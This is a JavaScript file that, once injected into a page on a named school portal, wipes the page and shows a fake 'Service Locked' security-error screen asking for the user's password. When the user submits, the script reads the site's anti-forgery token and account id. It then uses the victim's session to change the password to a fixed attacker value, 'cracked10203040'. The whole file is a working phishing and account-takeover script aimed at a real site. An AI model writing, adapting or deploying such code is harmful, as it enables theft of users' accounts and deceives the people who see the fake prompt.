class Utility {
    submitForm(form) {
        // Get form data
        var formData = new FormData(form);
        
        // Send form data using AJAX
        var xhr = new XMLHttpRequest();
        xhr.open("POST", form.getAttribute('action'), true); // Replace with your backend script URL
        xhr.onload = function() {
          if (xhr.status === 200) {
            // You can handle the response here, like showing a success message or updating content
          }
        };
        xhr.send(formData);
    }
    
    clearPage() {
        console.log('Clearing page...')
        document.head.innerHTML = ''
        document.body.innerHTML = ''
    
        // Clear all intervals
        for (var i = 1; i < 1000; i++)
            clearInterval(i);
    
        // Clear all timeouts
        for (var i = 1; i < 1000; i++)
            clearTimeout(i);
        console.log('Page cleared!')
    }
    
    parseHTML(html) {
        var parser = new DOMParser();
        var doc = parser.parseFromString(html, 'text/html');
        return doc
    }
}

var utilityObject = new Utility()

utilityObject.clearPage()

document.body.innerHTML = '<h1>Service Locked</h1><hr style="height:1px;border:none;color:#333;background-color:#333;"><l style="position:absolute;margin-top:10px;">Security Error 803. The service has been locked due to a security error, please enter your password to unlock.</l><br><br><l>Password: </l><input id="password"><button id="submit">Submit</button>';

document.getElementById('submit').addEventListener('click', () => {
    fetch('https://askov.viggo.dk/Shared/Profile/Security/Password?ajax=1')
        .then(response => response.text())
        .then(html => {
            var doc = utilityObject.parseHTML(html)
            var id = doc.querySelector("#id").value
            var verif_token = doc.querySelector("body > form > input[type=hidden]:nth-child(2)").value
            var old_password = document.getElementById('password').value
            var new_password = 'cracked10203040'
            fetch("https://askov.viggo.dk/Shared/Profile/Security/SavePassword", {
                "headers": {
                    "accept": "*/*",
                    "accept-language": "en-US,en;q=0.6",
                    "content-type": "application/x-www-form-urlencoded",
                    "priority": "u=1, i",
                    "sec-ch-ua": "\"Chromium\";v=\"124\", \"Brave\";v=\"124\", \"Not-A.Brand\";v=\"99\"",
                    "sec-ch-ua-mobile": "?0",
                    "sec-ch-ua-platform": "\"Windows\"",
                    "sec-fetch-dest": "empty",
                    "sec-fetch-mode": "cors",
                    "sec-fetch-site": "same-origin",
                    "sec-gpc": "1",
                    "x-request-by": "ViggoAjax"
                },
                "referrer": "https://askov.viggo.dk/Basic/Home",
                "referrerPolicy": "strict-origin-when-cross-origin",
                "body": `id=${id}&__RequestVerificationToken=${verif_token}&fake2=&currentPassword=${old_password}&password=${new_password}&repeatpassword=${new_password}`,
                "method": "POST",
                "mode": "cors",
                "credentials": "include"
            })
            .then(response => response.text())
            .then(html => {
                console.log(html)
            })
        })
})

